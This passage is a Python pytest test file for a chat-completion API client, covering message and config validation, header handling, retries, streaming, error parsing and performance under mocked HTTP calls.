        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream_with_bad_json()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            try:
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    chunks.append(chunk)
            except GenesisAPIError:
                pass  # Expected to handle malformed JSON gracefully
            
            # Should have processed at least the first valid chunk
            assert len(chunks) >= 1

    def test_validate_messages_with_mixed_invalid_roles(self, client):
        """Test message validation with a mix of valid and invalid roles."""
        mixed_messages = [
            ChatMessage(role="user", content="Valid message"),
            ChatMessage(role="invalid_role", content="Invalid role"),
            ChatMessage(role="assistant", content="Another valid message"),
            ChatMessage(role="another_invalid", content="Another invalid")
        ]
        
        with pytest.raises(ValidationError, match="Invalid message role"):
            client._validate_messages(mixed_messages)

    def test_validate_messages_with_whitespace_only_content(self, client):
        """Test message validation with whitespace-only content."""
        whitespace_messages = [
            ChatMessage(role="user", content="   "),  # Only spaces
            ChatMessage(role="user", content="\t\n"),  # Only tabs and newlines
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be empty"):
            client._validate_messages(whitespace_messages)

    def test_validate_model_config_edge_values(self, client):
        """Test model config validation with boundary values."""
        config = ModelConfig(name="test-model")
        
        # Test exact boundary values
        config.temperature = 0.0  # Minimum valid
        client._validate_model_config(config)
        
        config.temperature = 2.0  # Maximum valid
        client._validate_model_config(config)
        
        config.top_p = 0.0  # Minimum valid
        client._validate_model_config(config)
        
        config.top_p = 1.0  # Maximum valid
        client._validate_model_config(config)
        
        config.max_tokens = 1  # Minimum valid
        client._validate_model_config(config)

    def test_validate_model_config_float_precision(self, client):
        """Test model config validation with high precision float values."""
        config = ModelConfig(name="test-model")
        
        # Test values very close to boundaries
        config.temperature = 0.000001  # Very small but valid
        client._validate_model_config(config)
        
        config.temperature = 1.999999  # Very close to maximum but valid
        client._validate_model_config(config)

    @pytest.mark.asyncio
    async def test_list_models_empty_response(self, client):
        """Test list_models when API returns empty model list."""
        mock_response = {
            'object': 'list',
            'data': []
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            assert len(models) == 0
            assert isinstance(models, list)

    @pytest.mark.asyncio
    async def test_list_models_with_pagination(self, client):
        """Test list_models with paginated response."""
        mock_response = {
            'object': 'list',
            'data': [
                {'id': f'model-{i}', 'object': 'model', 'created': 1677610602}
                for i in range(50)  # Large number of models
            ],
            'has_more': False
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            assert len(models) == 50

    def test_build_headers_preserves_authorization(self, client):
        """Test that custom headers don't override the Authorization header."""
        malicious_headers = {
            'Authorization': 'Bearer fake-key',
            'X-Custom': 'value'
        }
        
        headers = client._build_headers(malicious_headers)
        
        # Should preserve the client's API key, not the custom one
        assert headers['Authorization'] == f'Bearer {client.api_key}'
        assert headers['X-Custom'] == 'value'

    def test_build_headers_case_sensitivity(self, client):
        """Test header building with case-sensitive header names."""
        custom_headers = {
            'content-type': 'text/plain',  # lowercase
            'AUTHORIZATION': 'Bearer fake',  # uppercase
            'X-Custom-Header': 'value'
        }
        
        headers = client._build_headers(custom_headers)
        
        # Should have both the default Content-Type and the custom one
        assert 'Content-Type' in headers
        assert 'content-type' in headers
        assert headers['Content-Type'] == 'application/json'  # Default
        assert headers['content-type'] == 'text/plain'  # Custom

    @pytest.mark.asyncio
    async def test_session_reuse_across_requests(self, client):
        """Test that the same session is reused across multiple requests."""
        mock_response = {
            'id': 'test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Test'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            session_before = client.session
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test 1")],
                model_config=ModelConfig(name="test-model")
            )
            
            session_after_first = client.session
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test 2")],
                model_config=ModelConfig(name="test-model")
            )
            
            session_after_second = client.session
            
            # Session should be the same across requests
            assert session_before is session_after_first
            assert session_after_first is session_after_second

    @pytest.mark.asyncio
    async def test_exponential_backoff_timing(self, client, sample_messages, sample_model_config):
        """Test that retry delays follow exponential backoff pattern."""
        delays = []
        
        async def mock_sleep(delay):
            delays.append(delay)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Server error'}}
            )
            
            with patch('asyncio.sleep', side_effect=mock_sleep):
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Verify exponential backoff pattern
                assert len(delays) == client.max_retries
                for i in range(1, len(delays)):
                    assert delays[i] > delays[i-1]  # Each delay should be longer


class TestAdvancedDataModels:
    """Extended tests for data model classes with edge cases."""
    
    def test_chat_message_with_none_values(self):
        """Test ChatMessage creation with None values where allowed."""
        message = ChatMessage(role="user", content="Test", name=None)
        assert message.name is None
        
        # Test that None content should be rejected if validation exists
        with pytest.raises((ValueError, TypeError)):
            ChatMessage(role="user", content=None)

    def test_chat_message_serialization(self):
        """Test ChatMessage can be serialized to dict for API requests."""
        message = ChatMessage(role="user", content="Hello", name="John")
        
        # Assuming there's a to_dict method or similar
        if hasattr(message, 'to_dict'):
            data = message.to_dict()
            assert data['role'] == 'user'
            assert data['content'] == 'Hello'
            assert data['name'] == 'John'
        elif hasattr(message, '__dict__'):
            # Fallback to checking attributes
            assert hasattr(message, 'role')
            assert hasattr(message, 'content')
            assert hasattr(message, 'name')

    def test_model_config_with_extreme_values(self):
        """Test ModelConfig with extreme but valid values."""
        config = ModelConfig(
            name="extreme-test",
            max_tokens=1000000,  # Very large
            temperature=0.0,     # Minimum
            top_p=1.0,          # Maximum
            frequency_penalty=2.0,  # Maximum (if supported)
            presence_penalty=-2.0   # Minimum (if supported)
        )
        
        assert config.max_tokens == 1000000
        assert config.temperature == 0.0
        assert config.top_p == 1.0

    def test_api_response_with_empty_data(self):
        """Test APIResponse creation with empty data."""
        response = APIResponse(
            status_code=204,  # No Content
            data={},
            headers={}
        )
        
        assert response.status_code == 204
        assert response.data == {}
        assert response.headers == {}

    def test_chat_completion_with_minimal_data(self):
        """Test ChatCompletion creation with minimal required data."""
        completion = ChatCompletion(
            id="minimal-test",
            object="chat.completion",
            created=0,
            model="test-model",
            choices=[],
            usage={}
        )
        
        assert completion.id == "minimal-test"
        assert len(completion.choices) == 0
        assert completion.usage == {}


class TestAdvancedExceptionHandling:
    """Extended tests for exception handling and error conditions."""
    
    def test_genesis_api_error_with_none_status_code(self):
        """Test GenesisAPIError when status_code is None."""
        error = GenesisAPIError("Error without status code", status_code=None)
        assert str(error) == "Error without status code"
        assert error.status_code is None

    def test_rate_limit_error_with_invalid_retry_after(self):
        """Test RateLimitError with invalid retry_after values."""
        # Test with negative retry_after
        error = RateLimitError("Rate limited", retry_after=-1)
        assert error.retry_after == -1  # Should store as-is
        
        # Test with very large retry_after
        error = RateLimitError("Rate limited", retry_after=999999)
        assert error.retry_after == 999999

    def test_exception_inheritance_chain(self):
        """Test that all custom exceptions inherit correctly."""
        auth_error = AuthenticationError("Auth failed")
        rate_error = RateLimitError("Rate limited")
        validation_error = ValidationError("Validation failed")
        
        # All should inherit from GenesisAPIError
        assert isinstance(auth_error, GenesisAPIError)
        assert isinstance(rate_error, GenesisAPIError)
        assert isinstance(validation_error, GenesisAPIError)
        
        # And ultimately from Exception
        assert isinstance(auth_error, Exception)
        assert isinstance(rate_error, Exception)
        assert isinstance(validation_error, Exception)


class TestAdvancedUtilityFunctions:
    """Extended tests for utility functions with edge cases."""
    
    def test_format_timestamp_edge_cases(self):
        """Test timestamp formatting with edge case values."""
        from app.ai_backend.genesis_api import format_timestamp
        
        # Test with zero timestamp
        formatted = format_timestamp(0)
        assert isinstance(formatted, str)
        
        # Test with very large timestamp
        large_timestamp = 9999999999
        formatted = format_timestamp(large_timestamp)
        assert isinstance(formatted, str)
        
        # Test with negative timestamp (if supported)
        try:
            formatted = format_timestamp(-1)
            assert isinstance(formatted, str)
        except (ValueError, OSError):
            pass  # May not be supported on all systems

    def test_calculate_token_usage_empty_messages(self):
        """Test token usage calculation with empty message list."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        usage = calculate_token_usage([])
        assert isinstance(usage, dict)
        assert usage.get('estimated_tokens', 0) == 0

    def test_calculate_token_usage_large_messages(self):
        """Test token usage calculation with very large messages."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        large_messages = [
            ChatMessage(role="user", content="x" * 10000),
            ChatMessage(role="assistant", content="y" * 5000)
        ]
        
        usage = calculate_token_usage(large_messages)
        assert isinstance(usage, dict)
        assert 'estimated_tokens' in usage
        assert usage['estimated_tokens'] > 0

    @pytest.mark.parametrize("content,min_tokens,max_tokens", [
        ("", 0, 1),
        ("x" * 1000, 100, 1500),  # Range for very long text
        ("Hello world! 123 @#$", 2, 10),  # Mixed content
        ("🚀💖🌍", 1, 10),  # Emojis
    ])
    def test_estimate_tokens_ranges(self, content, min_tokens, max_tokens):
        """Test token estimation returns reasonable ranges for various content types."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        tokens = estimate_tokens(content)
        assert min_tokens <= tokens <= max_tokens
        assert isinstance(tokens, int)

    def test_estimate_tokens_consistency(self):
        """Test that token estimation is consistent for the same input."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        content = "This is a test message for consistency checking."
        
        # Call multiple times and ensure consistent results
        results = [estimate_tokens(content) for _ in range(5)]
        assert all(r == results[0] for r in results)


class TestAdvancedIntegration:
    """Extended integration tests for complex workflows."""
    
    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_full_conversation_simulation(self):
        """Test a complete multi-turn conversation simulation."""
        config = {'api_key': 'test-key'}
        
        conversation_responses = [
            {
                'id': 'conv-1',
                'choices': [{'message': {'role': 'assistant', 'content': 'Hello! How can I help?'}}],
                'usage': {'total_tokens': 15}
            },
            {
                'id': 'conv-2', 
                'choices': [{'message': {'role': 'assistant', 'content': 'I can help with that!'}}],
                'usage': {'total_tokens': 25}
            },
            {
                'id': 'conv-3',
                'choices': [{'message': {'role': 'assistant', 'content': 'Anything else?'}}],
                'usage': {'total_tokens': 35}
            }
        ]
        
        call_count = 0
        
        async def mock_post_conversation(*args, **kwargs):
            nonlocal call_count
            response = Mock()
            response.status = 200
            response.json = AsyncMock(return_value=conversation_responses[call_count])
            call_count += 1
            return response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_conversation):
            async with GenesisAPIClient(**config) as client:
                conversation = []
                
                # Turn 1
                conversation.append(ChatMessage(role="user", content="Hello"))
                result1 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                conversation.append(ChatMessage(
                    role="assistant", 
                    content=result1.choices[0].message.content
                ))
                
                # Turn 2
                conversation.append(ChatMessage(role="user", content="I need help"))
                result2 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                conversation.append(ChatMessage(
                    role="assistant",
                    content=result2.choices[0].message.content
                ))
                
                # Turn 3
                conversation.append(ChatMessage(role="user", content="Thanks"))
                result3 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                
                assert len(conversation) == 5  # 3 user + 2 assistant messages
                assert result1.id == 'conv-1'
                assert result2.id == 'conv-2'
                assert result3.id == 'conv-3'

    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_streaming_conversation_workflow(self):
        """Test a streaming conversation with multiple chunks per response."""
        config = {'api_key': 'test-key'}
        
        # Simulate streaming chunks for a complete response
        mock_chunks = [
            {'choices': [{'delta': {'role': 'assistant'}}]},
            {'choices': [{'delta': {'content': 'I'}}]},
            {'choices': [{'delta': {'content': ' can'}}]},
            {'choices': [{'delta': {'content': ' help'}}]},
            {'choices': [{'delta': {'content': ' you'}}]},
            {'choices': [{'delta': {'content': ' with'}}]},
            {'choices': [{'delta': {'content': ' that!'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                full_content = ""
                chunk_count = 0
                
                async for chunk in client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Help me")],
                    model_config=ModelConfig(name="test-model")
                ):
                    chunk_count += 1
                    if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                        if chunk.choices[0].delta.content:
                            full_content += chunk.choices[0].delta.content
                
                assert chunk_count == len(mock_chunks)
                assert full_content == "I can help you with that!"


class TestAdvancedPerformance:
    """Extended performance and stress tests."""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_memory_usage_with_large_responses(self):
        """Test memory efficiency with very large API responses."""
        config = {'api_key': 'test-key'}
        
        # Create a very large mock response
        large_content = "x" * 100000  # 100KB of content
        mock_response = {
            'id': 'large-response-test',
            'choices': [{'message': {'content': large_content}}],
            'usage': {'total_tokens': 25000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Generate large text")],
                    model_config=ModelConfig(name="test-model", max_tokens=30000)
                )
                
                assert len(result.choices[0].message.content) == 100000
                assert result.usage.total_tokens == 25000

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_rapid_sequential_requests(self):
        """Test rapid sequential API requests without concurrency."""
        config = {'api_key': 'test-key'}
        
        mock_response = {
            'id': 'sequential-test',
            'choices': [{'message': {'content': 'Sequential response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                start_time = datetime.now()
                
                results = []
                for i in range(20):  # 20 rapid sequential requests
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content=f"Request {i}")],
                        model_config=ModelConfig(name="test-model")
                    )
                    results.append(result)
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                assert len(results) == 20
                assert all(r.id == 'sequential-test' for r in results)
                # Verify it completed in reasonable time (adjust threshold as needed)
                assert duration < 10  # Should complete in under 10 seconds

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_streaming_performance_with_many_chunks(self):
        """Test streaming performance with a large number of small chunks."""
        config = {'api_key': 'test-key'}
        
        # Generate many small chunks
        mock_chunks = []
        for i in range(1000):  # 1000 small chunks
            mock_chunks.append({'choices': [{'delta': {'content': f'{i}'}}]})
        mock_chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                start_time = datetime.now()
                
                chunk_count = 0
                async for chunk in client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Generate many chunks")],
                    model_config=ModelConfig(name="test-model")
                ):
                    chunk_count += 1
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                assert chunk_count == 1001  # 1000 content chunks + 1 finish chunk
                # Verify reasonable processing time
                assert duration < 5  # Should process 1000 chunks in under 5 seconds


# Test configuration and framework validation
class TestFrameworkConfiguration:
    """Tests to validate the testing framework and configuration."""
    
    def test_pytest_framework_available(self):
        """Verify that pytest is the testing framework in use."""
        import pytest
        assert pytest.__version__ is not None
        # This test confirms we're using pytest as the testing framework
    
    def test_asyncio_support_available(self):
        """Verify that asyncio testing support is properly configured."""
        import asyncio
        
        # Test that we can create and run async functions
        async def dummy_async():
            await asyncio.sleep(0.001)
            return True
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(dummy_async())
            assert result is True
        finally:
            loop.close()
    
    def test_mock_libraries_available(self):
        """Verify that all required mocking libraries are available."""
        from unittest.mock import Mock, patch, AsyncMock, MagicMock
        
        # Test that we can create different types of mocks
        mock = Mock()
        async_mock = AsyncMock()
        magic_mock = MagicMock()
        
        assert mock is not None
        assert async_mock is not None
        assert magic_mock is not None
        
        # Test basic patching functionality
        with patch('builtins.print') as mock_print:
            print("test")
            mock_print.assert_called_once_with("test")


if __name__ == "__main__":
    # Extended test runner configuration
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "--maxfail=5",  # Stop after 5 failures
        "--disable-warnings",  # Reduce noise in output
        "-x"  # Stop on first failure for debugging
    ])

# Additional comprehensive test coverage for edge cases and scenarios
class TestComprehensiveEdgeCases:
    """Comprehensive edge case testing for Genesis API client."""
    
    @pytest.fixture
    def client_with_minimal_config(self):
        """Client with absolute minimal configuration."""
        return GenesisAPIClient(api_key='minimal-key')
    
    def test_client_initialization_with_special_characters_in_api_key(self):
        """Test client initialization with special characters in API key."""
        special_keys = [
            'sk-test_key.with.dots',
            'sk-test/key/with/slashes',
            'sk-test key with spaces',
            'sk-test-key-with-unicode-éñ',
            'sk-test\nkey\nwith\nnewlines'
        ]
        
        for key in special_keys:
            client = GenesisAPIClient(api_key=key)
            assert client.api_key == key
    
    def test_client_initialization_with_empty_string_api_key(self):
        """Test that empty string API key raises ValueError."""
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient(api_key='')
    
    def test_client_initialization_with_whitespace_only_api_key(self):
        """Test that whitespace-only API key raises ValueError."""
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient(api_key='   ')
    
    def test_client_initialization_with_none_api_key(self):
        """Test that None API key raises ValueError."""
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient(api_key=None)
    
    def test_client_initialization_with_extreme_timeout_values(self):
        """Test client initialization with extreme timeout values."""
        # Test with very small positive timeout
        client = GenesisAPIClient(api_key='test', timeout=0.001)
        assert client.timeout == 0.001
        
        # Test with very large timeout
        client = GenesisAPIClient(api_key='test', timeout=3600)
        assert client.timeout == 3600
    
    def test_client_initialization_with_extreme_retry_values(self):
        """Test client initialization with extreme retry values."""
        # Test with zero retries
        client = GenesisAPIClient(api_key='test', max_retries=0)
        assert client.max_retries == 0
        
        # Test with very large retry count
        client = GenesisAPIClient(api_key='test', max_retries=100)
        assert client.max_retries == 100
    
    def test_client_initialization_with_invalid_base_url_formats(self):
        """Test client initialization with various invalid base URL formats."""
        invalid_urls = [
            'not-a-url',
            'ftp://invalid.protocol',
            'http://localhost:99999',  # Invalid port
            'https://domain..com',     # Double dots
            'https://domain .com',     # Space in domain
            ''  # Empty string
        ]
        
        for url in invalid_urls:
            # Should not raise during initialization, but may cause issues during requests
            client = GenesisAPIClient(api_key='test', base_url=url)
            assert client.base_url == url
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_null_bytes_in_content(self, client):
        """Test chat completion with null bytes in message content."""
        messages_with_nulls = [
            ChatMessage(role="user", content="Hello\x00World"),
            ChatMessage(role="user", content="Test\x00\x00Multiple\x00Nulls"),
        ]
        
        mock_response = {
            'id': 'null-bytes-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Handled null bytes'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle null bytes gracefully
            result = await client.create_chat_completion(
                messages=messages_with_nulls,
                model_config=ModelConfig(name="test-model")
            )
            assert result.id == 'null-bytes-test'
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_control_characters(self, client):
        """Test chat completion with various control characters."""
        control_chars_message = ChatMessage(
            role="user", 
            content="Test\t\n\r\f\v\b\a with control chars"
        )
        
        mock_response = {
            'id': 'control-chars-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Handled control chars'}}],
            'usage': {'total_tokens': 15}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=[control_chars_message],
                model_config=ModelConfig(name="test-model")
            )
            assert result.id == 'control-chars-test'
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_maximum_unicode_characters(self, client):
        """Test chat completion with maximum Unicode characters."""
        unicode_message = ChatMessage(
            role="user",
            content="Test with max Unicode: \U0001F600\U0001F1FA\U0001F1F8\U0001F4A9\U0001F30D"
        )
        
        mock_response = {
            'id': 'unicode-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Unicode handled \U0001F44D'}}],
            'usage': {'total_tokens': 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=[unicode_message],
                model_config=ModelConfig(name="test-model")
            )
            assert result.choices[0].message.content == 'Unicode handled \U0001F44D'
    
    def test_validate_messages_with_extremely_long_role_names(self, client):
        """Test message validation with extremely long role names."""
        long_role_name = "user" + "x" * 1000  # Very long role name
        invalid_message = ChatMessage(role=long_role_name, content="Test")
        
        with pytest.raises(ValidationError, match="Invalid message role"):
            client._validate_messages([invalid_message])
    
    def test_validate_messages_with_numeric_roles(self, client):
        """Test message validation with numeric roles."""
        numeric_roles = [123, 456.789, 0, -1]
        
        for role in numeric_roles:
            invalid_message = ChatMessage(role=str(role), content="Test")
            with pytest.raises(ValidationError, match="Invalid message role"):
                client._validate_messages([invalid_message])
    
    def test_validate_messages_with_boolean_content(self, client):
        """Test message validation with boolean content."""
        boolean_messages = [
            ChatMessage(role="user", content=str(True)),
            ChatMessage(role="user", content=str(False))
        ]
        
        # Should pass validation if converted to string
        try:
            client._validate_messages(boolean_messages)
        except ValidationError:
            pass  # May fail depending on implementation
    
    def test_validate_model_config_with_infinity_values(self, client):
        """Test model config validation with infinity values."""
        config = ModelConfig(name="test-model")
        
        # Test with positive infinity
        config.temperature = float('inf')
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(config)
        
        # Test with negative infinity
        config.temperature = float('-inf')
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(config)
    
    def test_validate_model_config_with_nan_values(self, client):
        """Test model config validation with NaN values."""
        config = ModelConfig(name="test-model")
        
        config.temperature = float('nan')
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(config)
        
        config.temperature = 0.5  # Reset to valid
        config.top_p = float('nan')
        with pytest.raises(ValidationError, match="Top_p must be between 0 and 1"):
            client._validate_model_config(config)
    
    def test_validate_model_config_with_string_numeric_values(self, client):
        """Test model config validation with string representations of numbers."""
        config = ModelConfig(name="test-model")
        
        # These should fail if the implementation doesn't handle string conversion
        try:
            config.temperature = "0.5"
            config.max_tokens = "1000"
            config.top_p = "0.8"
            client._validate_model_config(config)
        except (TypeError, ValidationError):
            pass  # Expected if implementation doesn't handle string conversion
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_exactly_max_tokens(self, client):
        """Test chat completion with exactly maximum allowed tokens."""
        # Assuming some reasonable maximum token limit
        max_tokens = 4096
        
        mock_response = {
            'id': 'max-tokens-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'x' * max_tokens}}],
            'usage': {'total_tokens': max_tokens}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Generate max tokens")],
                model_config=ModelConfig(name="test-model", max_tokens=max_tokens)
            )
            assert result.usage.total_tokens == max_tokens
    
    @pytest.mark.asyncio
    async def test_multiple_clients_concurrent_usage(self):
        """Test multiple client instances used concurrently."""
        clients = []
        for i in range(5):
            client = GenesisAPIClient(api_key=f'test-key-{i}')
            clients.append(client)
        
        mock_response = {
            'id': 'concurrent-clients-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Concurrent response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            tasks = []
            for client in clients:
                task = client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Test")],
                    model_config=ModelConfig(name="test-model")
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            assert len(results) == 5
            for result in results:
                assert result.id == 'concurrent-clients-test'
        
        # Clean up clients
        for client in clients:
            await client.close()
    
    @pytest.mark.asyncio
    async def test_client_session_lifecycle_management(self, client):
        """Test proper session lifecycle management."""
        # Session should be created lazily
        assert client.session is not None
        
        # Session should be reusable
        session_before = client.session
        
        mock_response = {
            'id': 'session-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Session test'}}],
            'usage': {'total_tokens': 5}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test")],
                model_config=ModelConfig(name="test-model")
            )
        
        session_after = client.session
        assert session_before is session_after
        
        # Session should be closed after client close
        await client.close()
        assert client.session.closed
    
    @pytest.mark.asyncio
    async def test_error_handling_with_missing_error_message(self, client):
        """Test error handling when API response lacks error message."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 400
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {}}  # Missing 'message' field
            )
            
            with pytest.raises(ValidationError):
                await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Test")],
                    model_config=ModelConfig(name="test-model")
                )
    
    @pytest.mark.asyncio
    async def test_error_handling_with_malformed_error_structure(self, client):
        """Test error handling with completely malformed error structure."""
        malformed_responses = [
            {'not_error': 'field'},
            {'error': 'string_instead_of_object'},
            {'error': ['list_instead_of_object']},
            {'error': None},
            {}  # Empty response
        ]
        
        for response in malformed_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.status = 400
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response)
                
                with pytest.raises(ValidationError):
                    await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="Test")],
                        model_config=ModelConfig(name="test-model")
                    )


class TestExtremePerformanceScenarios:
    """Test extreme performance scenarios and resource management."""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_memory_pressure_with_many_large_messages(self):
        """Test behavior under memory pressure with many large messages."""
        config = {'api_key': 'test-key'}
        
        # Create many large messages
        large_messages = []
        for i in range(100):
            large_content = f"Message {i}: " + "x" * 1000
            large_messages.append(ChatMessage(role="user" if i % 2 == 0 else "assistant", content=large_content))
        
        mock_response = {
            'id': 'memory-pressure-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Memory pressure handled'}}],
            'usage': {'total_tokens': 50000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                result = await client.create_chat_completion(
                    messages=large_messages,
                    model_config=ModelConfig(name="test-model", max_tokens=60000)
                )
                
                assert result.id == 'memory-pressure-test'
                assert result.usage.total_tokens == 50000
    
    @pytest.mark.asyncio
    @pytest.mark.performance
